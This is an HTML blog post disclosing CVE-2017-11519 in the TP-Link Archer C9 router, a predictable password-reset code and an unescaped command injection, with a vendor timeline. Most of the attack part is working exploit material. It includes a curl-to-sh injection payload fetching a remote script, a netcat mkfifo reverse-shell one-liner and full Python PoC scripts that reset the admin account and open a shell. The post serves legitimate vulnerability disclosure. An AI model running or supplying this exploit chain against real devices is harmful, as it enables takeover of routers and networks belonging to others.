@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <meta charset='utf-8'>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width,maximum-scale=2">
+  <link rel="stylesheet" type="text/css" media="screen"
+    href="/assets/css/style.css?v=254ec4f76e4cc22c380037c8ba0d300661142d2d">
+
+  <!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>TP-Link Archer C9 - Admin Password Reset and RCE (CVE-2017-11519) | devcraft.io</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="TP-Link Archer C9 - Admin Password Reset and RCE (CVE-2017-11519)" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="I recently bought a new Archer C9 router and decided to have a look around at the firmware to see what I could find. I ended up finding out a way to reset the admin password gain a remote shell from an unauthenticated user." />
+<meta property="og:description" content="I recently bought a new Archer C9 router and decided to have a look around at the firmware to see what I could find. I ended up finding out a way to reset the admin password gain a remote shell from an unauthenticated user." />
+<link rel="canonical" href="https://devcraft.io/posts/2017/07/21/tp-link-archer-c9-admin-password-reset.html" />
+<meta property="og:url" content="https://devcraft.io/posts/2017/07/21/tp-link-archer-c9-admin-password-reset.html" />
+<meta property="og:site_name" content="devcraft.io" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2017-07-21T05:48:12+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="TP-Link Archer C9 - Admin Password Reset and RCE (CVE-2017-11519)" />
+<script type="application/ld+json">
+{"description":"I recently bought a new Archer C9 router and decided to have a look around at the firmware to see what I could find. I ended up finding out a way to reset the admin password gain a remote shell from an unauthenticated user.","url":"https://devcraft.io/posts/2017/07/21/tp-link-archer-c9-admin-password-reset.html","@type":"BlogPosting","headline":"TP-Link Archer C9 - Admin Password Reset and RCE (CVE-2017-11519)","dateModified":"2017-07-21T05:48:12+00:00","datePublished":"2017-07-21T05:48:12+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://devcraft.io/posts/2017/07/21/tp-link-archer-c9-admin-password-reset.html"},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+
+  <!-- HEADER -->
+  <div id="header_wrap" class="outer">
+    <header class="inner">
+      <a id="site_link" href="/">
+        <h1 id="project_title">devcraft.io</h1>
+      </a>
+      <h2 id="project_tagline"><p>CTF write ups by <a href="https://twitter.com/wcbowling">vakzz</a></p>
+</h2>
+      
+    </header>
+  </div>
+
+  <!-- MAIN CONTENT -->
+  <div id="main_content_wrap" class="outer">
+    <section id="main_content" class="inner">
+      <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">
+      TP-Link Archer C9 - Admin Password Reset and RCE (CVE-2017-11519)
+    </h1>
+    <p class="post-meta">
+      <time
+        datetime="2017-07-21T05:48:12+00:00"
+        itemprop="datePublished"
+        >Jul 21, 2017</time
+      >
+    </p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <p>I recently bought a new Archer C9 router and decided to have a look around at the firmware to see what I could find. I ended up finding out a way to reset the admin password gain a remote shell from an unauthenticated user.</p>
+
+<h2 id="reseting-the-admin-password">Reseting the admin password</h2>
+<p>After downloading and extracting the firmware from the <a href="http://www.tp-link.com/en/download/Archer-C9_V2.html#Firmware">TP-Link website</a> I saw that most of the admin interface was written in lua. With a bit of digging I can across the password reset feature, designed to allow the admin to reset their password if they forget it.</p>
+
+<p>This is disabled by default, but the only time that this setting was checked was to see if the code should be emailed to the admin or not. The reset token was still created when requested regardless of the settings, and could be used to reset the password if correctly supplied.</p>
+
+<p>Looking at <code class="language-plaintext highlighter-rouge">passwd_recovery.lua</code> to see how the token was created, we see that it is created with the following:</p>
+
+<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">math.randomseed</span><span class="p">(</span><span class="nb">os.time</span><span class="p">())</span>
+<span class="n">vercode</span> <span class="o">=</span> <span class="nb">math.random</span><span class="p">(</span><span class="mi">100000</span><span class="p">,</span> <span class="mi">999999</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Once the token is created, it is valid for 10 minutes, after which a new token will need to be generated.</p>
+
+<p><code class="language-plaintext highlighter-rouge">os.time()</code> returns the seconds since epoch, so we should easily be able to recreate this token by seeding with the same number! The router also returns a <code class="language-plaintext highlighter-rouge">Date</code> header, so we can just parse that and get the exact server time and hence the exact seed!</p>
+
+<p>So all we need to do is:</p>
+<ol>
+  <li>Parse the Date header from the router to determine the server time</li>
+  <li>Request a reset token</li>
+  <li>Seed our prng with the server time and generate the code</li>
+  <li>Submit the token and reset the admin account back to <code class="language-plaintext highlighter-rouge">admin</code>/<code class="language-plaintext highlighter-rouge">admin</code></li>
+</ol>
+
+<h2 id="remote-code-execution">Remote Code Execution</h2>
+
+<p>Now that we have admin access to the router it’s time to try and get RCE.</p>
+
+<p>Most of the code that calls out to external commands was correctly escaping the arguments, preventing command injection.</p>
+
+<p>After a bit of searching, I found that the following code gets run when the admin password is updated:</p>
+
+<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sys</span><span class="p">.</span><span class="n">call</span><span class="p">(</span><span class="s2">"usbuser "</span> <span class="o">..</span> <span class="n">username</span> <span class="o">..</span> <span class="s2">" '"</span> <span class="o">..</span> <span class="n">password</span> <span class="o">..</span> <span class="s2">"'"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Username and password are unescaped, but are limited to 16 characters and must be in the ascii range of 33-126 (no spaces).</p>
+
+<p>After some more testing I found the following payload could be used to execute a remote script:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">web</span> <span class="o">=</span> <span class="s">"hack.me/s"</span>
+<span class="n">username</span> <span class="o">=</span> <span class="s">";curl"</span>
+<span class="n">password</span> <span class="o">=</span> <span class="s">"%s'|sh'"</span><span class="o">%</span><span class="n">web</span>
+</code></pre></div></div>
+
+<p>So long as <code class="language-plaintext highlighter-rouge">web</code> is 10 or less characters, the router will execute whatever commands are returned. I tested and got a simple reverse shell using:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>
+
+<span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 123.123.123.123 12345 <span class="o">&gt;</span>/tmp/f &amp;
+</code></pre></div></div>
+
+<h2 id="timeline">Timeline</h2>
+
+<p>TP-Link quick were great to work with, they quickly responded to the initial report and published an update firmware within 3 weeks.</p>
+
+<ul>
+  <li>2017-04-20 - Contacted TP-Link with initial findings</li>
+  <li>2017-04-20 - TP-Link responded asking for more details</li>
+  <li>2017-04-26 - TP-Link responded saying they are still investigating</li>
+  <li>2017-04-28 - TP-Link confirmed issues and are working on a fix</li>
+  <li>2017-04-28 - TP-Link send beta firmware to ensure issue was resolved</li>
+  <li>2017-05-11 - TP-Link published updated firmware</li>
+</ul>
+
+<h2 id="links">Links</h2>
+<ul>
+  <li><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11519">CVE-2017-11519</a></li>
+  <li><a href="http://www.tp-link.com/en/download/Archer-C9_V2.html#Firmware">Archer C9 V2 Firemware</a></li>
+</ul>
+
+<h2 id="poc-scripts">POC Scripts</h2>
+
+<p><code class="language-plaintext highlighter-rouge">tplink.py</code>:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">email.utils</span> <span class="k">as</span> <span class="n">eut</span>
+<span class="kn">import</span> <span class="nn">math</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">utils</span>
+
+
+<span class="k">class</span> <span class="nc">TPLinkPwn</span><span class="p">:</span>
+	<span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
+	    <span class="bp">self</span><span class="p">.</span><span class="n">url</span> <span class="o">=</span> <span class="n">url</span>
+	    <span class="bp">self</span><span class="p">.</span><span class="n">cookies</span> <span class="o">=</span> <span class="bp">None</span>
+	    <span class="bp">self</span><span class="p">.</span><span class="n">token</span> <span class="o">=</span> <span class="s">""</span>
+	    <span class="bp">self</span><span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="bp">None</span>
+
+	<span class="k">def</span> <span class="nf">post</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+		<span class="k">return</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">'%s/cgi-bin/luci/;stok=%s/%s'</span><span class="o">%</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">url</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">token</span><span class="p">,</span> <span class="n">path</span><span class="p">),</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">cookies</span><span class="p">)</span>
+
+	<span class="k">def</span> <span class="nf">createCode</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+		<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+			<span class="s">"operation"</span><span class="p">:</span> <span class="s">"read"</span><span class="p">,</span>
+		<span class="p">}</span>
+		<span class="n">r</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">"login?form=vercode"</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+		<span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
+			<span class="k">print</span> <span class="s">"something went wrong"</span>
+			<span class="k">print</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span>
+			<span class="k">print</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span>
+			<span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+
+	<span class="k">def</span> <span class="nf">resetAdmin</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">time</span><span class="p">):</span>
+		<span class="n">code</span> <span class="o">=</span> <span class="n">utils</span><span class="p">.</span><span class="n">random</span><span class="p">(</span><span class="n">time</span><span class="p">,</span> <span class="mi">100000</span><span class="p">,</span> <span class="mi">999999</span><span class="p">)</span>
+
+		<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+			<span class="s">"operation"</span><span class="p">:</span> <span class="s">"write"</span><span class="p">,</span>
+			<span class="s">"vercode"</span><span class="p">:</span> <span class="n">code</span>
+		<span class="p">}</span>
+
+		<span class="n">json</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">"login?form=vercode"</span><span class="p">,</span> <span class="n">data</span><span class="p">).</span><span class="n">json</span><span class="p">()</span>
+		<span class="k">if</span> <span class="n">json</span><span class="p">[</span><span class="s">"success"</span><span class="p">]</span> <span class="o">==</span> <span class="bp">True</span><span class="p">:</span>
+			<span class="k">print</span> <span class="s">"Found code %d, admin password reset"</span><span class="o">%</span><span class="n">code</span>
+			<span class="k">return</span> <span class="bp">True</span>
+		<span class="k">return</span> <span class="bp">False</span>
+
+	<span class="k">def</span> <span class="nf">guessCode</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">time</span><span class="p">):</span>
+		<span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">resetAdmin</span><span class="p">(</span><span class="n">time</span><span class="p">):</span>
+			<span class="k">return</span> <span class="bp">True</span>
+		<span class="k">else</span><span class="p">:</span>
+			<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">time</span><span class="p">,</span> <span class="n">time</span><span class="o">+</span><span class="mi">5</span><span class="p">):</span>
+				<span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">resetAdmin</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
+					<span class="k">return</span> <span class="bp">True</span>
+
+		<span class="k">return</span> <span class="bp">False</span>
+
+	<span class="k">def</span> <span class="nf">getDate</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+		<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">url</span><span class="p">)</span>
+		<span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
+			<span class="k">print</span> <span class="s">"something went wrong"</span>
+			<span class="k">print</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span>
+			<span class="k">print</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span>
+			<span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+		<span class="n">dateStr</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="s">"Date"</span><span class="p">]</span>
+
+		<span class="k">return</span> <span class="n">eut</span><span class="p">.</span><span class="n">mktime_tz</span><span class="p">(</span><span class="n">eut</span><span class="p">.</span><span class="n">parsedate_tz</span><span class="p">(</span><span class="n">dateStr</span><span class="p">))</span>
+
+	<span class="k">def</span> <span class="nf">setUsbSharing</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+		<span class="k">print</span> <span class="s">"Making sure the sharing account is the default account"</span>
+		<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+			<span class="s">"operation"</span><span class="p">:</span> <span class="s">"write"</span><span class="p">,</span>
+			<span class="s">"account"</span><span class="p">:</span> <span class="s">"admin"</span>
+		<span class="p">}</span>
+		<span class="n">json</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">"admin/folder_sharing?form=account"</span><span class="p">,</span> <span class="n">data</span><span class="p">).</span><span class="n">json</span><span class="p">()</span>
+		<span class="k">assert</span> <span class="n">json</span><span class="p">[</span><span class="s">"success"</span><span class="p">]</span>
+
+	<span class="k">def</span> <span class="nf">getRsaKey</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+		<span class="k">print</span> <span class="s">"Reading RSA key"</span>
+		<span class="n">json</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">"login?form=login"</span><span class="p">,</span> <span class="p">{</span><span class="s">"operation"</span><span class="p">:</span><span class="s">"read"</span><span class="p">}).</span><span class="n">json</span><span class="p">()</span>
+		<span class="k">assert</span> <span class="n">json</span><span class="p">[</span><span class="s">"success"</span><span class="p">]</span>
+
+		<span class="n">n</span><span class="p">,</span><span class="n">e</span> <span class="o">=</span> <span class="n">json</span><span class="p">[</span><span class="s">"data"</span><span class="p">][</span><span class="s">"password"</span><span class="p">]</span>
+		<span class="bp">self</span><span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="n">utils</span><span class="p">.</span><span class="n">pubKey</span><span class="p">(</span><span class="n">n</span><span class="p">,</span><span class="n">e</span><span class="p">)</span>
+
+	<span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+		<span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="p">.</span><span class="n">key</span><span class="p">:</span>
+			<span class="bp">self</span><span class="p">.</span><span class="n">getRsaKey</span><span class="p">()</span>
+
+		<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+		  <span class="s">"operation"</span><span class="p">:</span> <span class="s">"login"</span><span class="p">,</span>
+			<span class="s">"username"</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
+			<span class="s">"password"</span><span class="p">:</span> <span class="n">utils</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">key</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+		<span class="p">}</span>
+		<span class="k">print</span> <span class="s">"Logging in"</span>
+		<span class="n">r</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">"login?form=login"</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+		<span class="n">json</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">json</span><span class="p">()</span>
+		<span class="k">assert</span> <span class="n">json</span><span class="p">[</span><span class="s">"success"</span><span class="p">]</span>
+
+		<span class="bp">self</span><span class="p">.</span><span class="n">cookies</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">cookies</span>
+		<span class="bp">self</span><span class="p">.</span><span class="n">token</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">json</span><span class="p">()[</span><span class="s">"data"</span><span class="p">][</span><span class="s">"stok"</span><span class="p">]</span>
+
+	<span class="k">def</span> <span class="nf">createAccount</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+		<span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">username</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">16</span> <span class="ow">and</span> <span class="s">' '</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">username</span>
+		<span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">password</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">16</span> <span class="ow">and</span> <span class="s">' '</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">password</span>
+
+		<span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="p">.</span><span class="n">key</span><span class="p">:</span>
+			<span class="bp">self</span><span class="p">.</span><span class="n">getRsaKey</span><span class="p">()</span>
+
+		<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+		  <span class="s">"operation"</span><span class="p">:</span> <span class="s">"set"</span><span class="p">,</span>
+			<span class="s">"new_acc"</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
+			<span class="s">"new_pwd"</span><span class="p">:</span> <span class="n">utils</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">key</span><span class="p">,</span> <span class="n">password</span><span class="p">),</span>
+			<span class="s">"cfm_pwd"</span><span class="p">:</span> <span class="n">utils</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">key</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+		<span class="p">}</span>
+
+		<span class="k">print</span> <span class="s">"Creating user account"</span>
+		<span class="n">json</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">"admin/administration?form=account"</span><span class="p">,</span> <span class="n">data</span><span class="p">).</span><span class="n">json</span><span class="p">()</span>
+		<span class="k">assert</span> <span class="n">json</span><span class="p">[</span><span class="s">"success"</span><span class="p">]</span>
+
+	<span class="k">def</span> <span class="nf">reset</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+		<span class="k">print</span> <span class="s">"Getting current time from Date header"</span>
+		<span class="n">time</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">getDate</span><span class="p">()</span>
+
+		<span class="k">print</span> <span class="s">"Renerating reset code"</span>
+		<span class="bp">self</span><span class="p">.</span><span class="n">createCode</span><span class="p">()</span>
+
+		<span class="k">print</span> <span class="s">"Finding reset code"</span>
+		<span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="p">.</span><span class="n">guessCode</span><span class="p">(</span><span class="n">time</span><span class="p">):</span>
+			<span class="k">print</span> <span class="s">"Code not found"</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
+		<span class="k">print</span> <span class="s">"usage: %s &lt;router base url&gt; [shell url]"</span><span class="o">%</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+		<span class="k">print</span> <span class="s">"%s http://192.168.0.1 hack.me/s"</span><span class="o">%</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+		<span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+
+	<span class="k">if</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">:</span>
+		<span class="k">print</span> <span class="s">"Shellcode url cannot be greater than 10 characters"</span>
+		<span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+
+	<span class="n">router</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+	<span class="n">shell</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+	<span class="s">"""
+		Command injection when changing the usb account as it runs the following:
+		os.execute("usbuser " .. username .. " '" .. password .. "'")
+
+		username and password are limitted to a length of 16 and no spaces eg 32 &lt; ord(c) &lt; 127
+	"""</span>
+	<span class="n">tp</span> <span class="o">=</span> <span class="n">TPLinkPwn</span><span class="p">(</span><span class="n">router</span><span class="p">)</span>
+	<span class="n">tp</span><span class="p">.</span><span class="n">reset</span><span class="p">()</span>
+	<span class="k">print</span> <span class="s">"Admin account reset to admin/admin"</span>
+
+	<span class="k">if</span> <span class="n">shell</span>
+		<span class="n">tp</span><span class="p">.</span><span class="n">login</span><span class="p">(</span><span class="s">"admin"</span><span class="p">,</span> <span class="s">"admin"</span><span class="p">)</span>
+		<span class="n">tp</span><span class="p">.</span><span class="n">setUsbSharing</span><span class="p">()</span>
+		<span class="n">tp</span><span class="p">.</span><span class="n">createAccount</span><span class="p">(</span><span class="s">";curl"</span><span class="p">,</span> <span class="s">"%s'|sh'"</span><span class="o">%</span><span class="n">shell</span><span class="p">)</span>
+
+		<span class="k">print</span> <span class="s">"Reverse shell activated"</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">utils.py</code>:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
+<span class="kn">import</span> <span class="nn">math</span>
+
+<span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
+<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">PKCS1_OAEP</span>
+
+<span class="n">RAND_MAX</span> <span class="o">=</span> <span class="mh">0x7fffffff</span>
+
+<span class="c1"># from https://github.com/qbx2/python_glibc_random
+</span><span class="k">def</span> <span class="nf">glibc_prng</span><span class="p">(</span><span class="n">seed</span><span class="p">):</span>
+	<span class="n">int32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="o">-</span><span class="mh">0x100000000</span> <span class="k">if</span> <span class="n">x</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="o">&gt;</span><span class="mh">0x7fffffff</span> <span class="k">else</span> <span class="n">x</span><span class="o">&amp;</span><span class="mh">0xffffffff</span>
+	<span class="n">int64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="o">&amp;</span><span class="mh">0xffffffffffffffff</span><span class="o">-</span><span class="mh">0x10000000000000000</span> <span class="k">if</span> <span class="n">x</span><span class="o">&amp;</span><span class="mh">0xffffffffffffffff</span><span class="o">&gt;</span><span class="mh">0x7fffffffffffffff</span> <span class="k">else</span> <span class="n">x</span><span class="o">&amp;</span><span class="mh">0xffffffffffffffff</span>
+
+	<span class="n">r</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">344</span>
+	<span class="n">r</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">seed</span>
+
+	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">31</span><span class="p">):</span>
+		<span class="n">r</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">int32</span><span class="p">(</span><span class="n">int64</span><span class="p">(</span><span class="mi">16807</span> <span class="o">*</span> <span class="n">r</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span> <span class="o">%</span> <span class="mh">0x7fffffff</span><span class="p">)</span>
+
+		<span class="k">if</span> <span class="n">r</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
+			<span class="n">r</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">int32</span><span class="p">(</span><span class="n">r</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x7fffffff</span><span class="p">)</span>
+
+
+	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">31</span><span class="p">,</span> <span class="mi">34</span><span class="p">):</span>
+		<span class="n">r</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">int32</span><span class="p">(</span><span class="n">r</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">31</span><span class="p">])</span>
+
+	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">34</span><span class="p">,</span> <span class="mi">344</span><span class="p">):</span>
+		<span class="n">r</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">int32</span><span class="p">(</span><span class="n">r</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">31</span><span class="p">]</span> <span class="o">+</span> <span class="n">r</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">3</span><span class="p">])</span>
+
+	<span class="n">i</span> <span class="o">=</span> <span class="mi">344</span> <span class="o">-</span> <span class="mi">1</span>
+
+	<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+		<span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+		<span class="n">r</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">int32</span><span class="p">(</span><span class="n">r</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">31</span><span class="p">]</span> <span class="o">+</span> <span class="n">r</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">3</span><span class="p">]))</span>
+		<span class="k">yield</span> <span class="n">int32</span><span class="p">((</span><span class="n">r</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">random</span><span class="p">(</span><span class="n">seed</span><span class="p">,</span> <span class="n">l</span><span class="p">,</span> <span class="n">u</span><span class="p">):</span>
+	<span class="n">prng</span> <span class="o">=</span> <span class="n">glibc_prng</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span>
+	<span class="n">r</span> <span class="o">=</span> <span class="nb">float</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">prng</span><span class="p">))</span><span class="o">%</span><span class="n">RAND_MAX</span> <span class="o">/</span> <span class="n">RAND_MAX</span>
+	<span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">math</span><span class="p">.</span><span class="n">floor</span><span class="p">(</span><span class="n">r</span><span class="o">*</span><span class="p">(</span><span class="n">u</span><span class="o">-</span><span class="n">l</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span><span class="o">+</span><span class="n">l</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">val</span><span class="p">):</span>
+	<span class="n">padding</span> <span class="o">=</span> <span class="p">(</span><span class="n">key</span><span class="p">.</span><span class="n">n</span><span class="p">.</span><span class="n">bit_length</span><span class="p">()</span><span class="o">+</span><span class="mi">7</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="mi">3</span>
